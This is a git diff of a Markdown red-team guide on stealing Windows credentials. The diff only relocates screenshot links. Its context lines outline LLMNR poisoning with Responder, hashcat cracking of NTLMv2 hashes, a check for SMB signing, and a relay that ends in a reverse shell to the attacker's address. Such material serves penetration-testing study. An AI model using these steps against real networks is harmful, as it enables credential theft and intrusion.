@@ -6,7 +6,7 @@
 - The victim believes the attacker and sends its own username and NTLMv2 hash to the attacker.
 - The attacker can now crack the hash to discover the password.
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/Screen1.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen1.png?raw=true)
 
 ### Responder
 ```
@@ -33,14 +33,14 @@ hashcat -m 5600 -a 3 hash.txt
 - User must have admin access on this machine.
 
 ### Responder with SMB & HTTP Disabled (in Responder.conf)
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/Screen2.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen2.png?raw=true)
 ```
 git clone https://github.com/SpiderLabs/Responder
 python Responder.py -I eth0 -wrf
 ```
 
 ### Determine the machines that have SMB signing disabled
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/Screen3.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen3.png?raw=true)
 
 ### Powershell Reverse Encoded Shell
 ```
@@ -72,5 +72,5 @@ exploit -j
 
 ### Overall Process Overview
 Machine 10.0.2.7 asks for an unknown host, then the attacker machine 10.0.2.15 responds to it with its own IP address, then machine 10.0.2.7 sends its credentials to the attacker machine 10.0.2.15 on port SMB, then the attacker machine takes these credentials and relays them to another machine 10.0.2.6, then machine 10.0.2.6 executed our reverse shell and the shell get back to us at 10.0.2.15.
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/Screen4.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/FindCredentials/Screen4.png?raw=true)
 Stealing hashes from 10.0.2.7 and authenticate with them to 10.0.2.6
